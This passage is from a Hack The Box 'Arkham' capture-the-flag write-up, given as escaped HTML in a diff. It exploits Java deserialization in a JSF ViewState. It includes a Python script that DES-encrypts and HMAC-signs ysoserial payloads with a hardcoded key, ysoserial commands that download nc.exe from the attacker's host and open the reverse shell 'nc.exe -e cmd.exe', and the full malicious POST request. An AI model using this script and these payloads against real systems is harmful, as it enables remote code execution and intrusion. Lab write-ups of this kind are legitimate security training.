+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pyDes&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[93m&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;des&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ECB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;padmode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PAD_PKCS5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hmac_sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'JsF9876-'&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[!] Usage : {} [Payload File] [Output File]&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Encrypting payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;  [!] Key : JsF9876-&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Creating HMAC signature&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Appending signature to the encrypted payload&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quote_plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Final payload : {}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;w&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Saved to : {}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;this-script-has-two-functions-encrypt-and-hmac_sig-encrypt-takes-the-payload-generated-by-ysoserial-and-des-encrypts-it-using-the-key-then-returns-the-encrypted-payload-hmac_sig-takes-the-encrypted-payload-and-generates-the-hmac-signature-that-will-be-appended-to-the-encrypted-payload&quot;&gt;This script has two functions, &lt;code class=&quot;highlighter-rouge&quot;&gt;encrypt()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;hmac_sig()&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;encrypt()&lt;/code&gt; takes the payload generated by &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;DES&lt;/code&gt; encrypts it using the key then returns the encrypted payload. &lt;code class=&quot;highlighter-rouge&quot;&gt;hmac_sig()&lt;/code&gt; takes the encrypted payload and generates the &lt;code class=&quot;highlighter-rouge&quot;&gt;hmac&lt;/code&gt; signature that will be appended to the encrypted payload.&lt;/h4&gt;
+&lt;h4 id=&quot;the-script-takes-two-arguments-first-one-is-for-the-filename-that-contains-the-ysoserial-generated-payload-it-encrypts-it-then-generates-the-hmac-signature-appends-it-to-the-encrypted-payload-base-64-encodes-the-final-payload-and-url-encodes-it-then-it-saves-the-payload-into-the-output-file-which-is-the-second-argument&quot;&gt;The script takes two arguments, first one is for the filename that contains the &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial&lt;/code&gt; generated payload, it encrypts it then generates the &lt;code class=&quot;highlighter-rouge&quot;&gt;hmac&lt;/code&gt; signature, appends it to the encrypted payload, base-64 encodes the final payload and &lt;code class=&quot;highlighter-rouge&quot;&gt;url&lt;/code&gt;-encodes it. Then it saves the payload into the output file which is the second argument.&lt;/h4&gt;
+&lt;h4 id=&quot;time-to-use-ysoserial--we-run-into-the-problem-of-which-payload-to-use-i-used-commonscollections5-and-it-worked&quot;&gt;Time to use &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial&lt;/code&gt;,  we run into the problem of which payload to use, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;CommonsCollections5&lt;/code&gt; and it worked.&lt;/h4&gt;
+&lt;h4 id=&quot;i-created-two-payloads-first-one-is-to-download-ncexe-from-my-box-and-save-it-in-cwindowssystem32spooldriverscolor-second-one-is-to-execute-the-reverse-shell-command--ncexe--e-cmdexe-1010xxxx-1337&quot;&gt;I created two payloads, first one is to download &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; from my box and save it in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\windows\system32\spool\drivers\color&lt;/code&gt;, second one is to execute the reverse shell command : &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe -e cmd.exe 10.10.xx.xx 1337&lt;/code&gt;&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# java -jar ysoserial.jar CommonsCollections5 'cmd.exe /c powershell -c Invoke-WebRequest -Uri &quot;http://10.10.xx.xx/nc.exe&quot; -OutFile &quot;C:\windows\system32\spool\drivers\color\nc.exe&quot;' &amp;gt; uploadnc.payload
+WARNING: An illegal reflective access operation has occurred
+WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/root/Desktop/HTB/boxes/arkham/ysoserial.jar) to field javax.management.BadAttributeValueExpException.val
+WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5
+WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
+WARNING: All illegal access operations will be denied in a future release
+root@kali:~/Desktop/HTB/boxes/arkham# java -jar ysoserial.jar CommonsCollections5 'cmd.exe /c &quot;C:\windows\system32\spool\drivers\color\nc.exe&quot; -e cmd.exe 10.10.xx.xx 1337' &amp;gt; executenc.payload
+WARNING: An illegal reflective access operation has occurred
+WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/root/Desktop/HTB/boxes/arkham/ysoserial.jar) to field javax.management.BadAttributeValueExpException.val
+WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5
+WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
+WARNING: All illegal access operations will be denied in a future release
+root@kali:~/Desktop/HTB/boxes/arkham# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;then-i-encrypted-them-with-my-script-&quot;&gt;Then I encrypted them with my script :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-ran-a-python-server-to-host-ncexe-and-i-started-my-nc-listener-on-port-1337-then-i-sent-the-payloads&quot;&gt;I ran a python server to host &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; and I started my &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; listener on port 1337, then I sent the payloads.&lt;/h4&gt;
+&lt;h4 id=&quot;1st-request-&quot;&gt;1st Request :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /userSubscribe.faces HTTP/1.1
+Host: arkham.htb:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://arkham.htb:8080/userSubscribe.faces
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3197
+Cookie: JSESSIONID=FFA2F263EA4D3BCCFAAEEFBE012A524D
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+j_id_jsp_1623871077_1%3Aemail=test&amp;amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;amp;javax.faces.ViewState=o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2Ozo%2Bus8jmf0nBttP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy1opEh7cDv2tdwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BTweGj5FUR%2FlCPgQijAFFrHWRvjlEtsVNbr09Qek%2F0QE3yWXS1W%2FgaT%2B7VnbdN2xAhE%2B9N5PSzJudEi8q%2Fo29VPSGioyPZd%2FiNpmNoUDeaeXEVrvY0L%2FaRMkBoThhoybIwKm9JRORG5quVg7mI39K3ANZaw6BBLyJDVbXmOcpydaV%2BJ4ehZuDU5EJNCdYdlqpK5IUgV5VNtTWO9f9YgPaneg14o%2B53eYRjgAQvWxmK%2FVII6JP9zUlbTzD60JeAbleovB8fLJf0D3aUv3mla%2B%2FLyWEXo2NfiqjFqPb9b4NHR199UdBVp6X2nev37%2Ftu0vBXvZz%2Bls4886hDPhV3RdASjsJaoZPrEReF8f43oev%2Bx6ZHIUdkCdk5uThniTrXeAWImx1USbtujkG0xSYdfK%2Fs8Az9gV7hyTmqI0ewkaYsX9uSA%2F9wVoArXnRX%2FrTg7PxMp9hGNKQN%2Fklr%2BXyc%3D
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;response-&quot;&gt;Response :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 500 
+Content-Type: text/html;charset=utf-8
+Content-Language: en
+Content-Length: 2570
+Date: Fri, 09 Aug 2019 18:36:52 GMT
+Connection: close
+
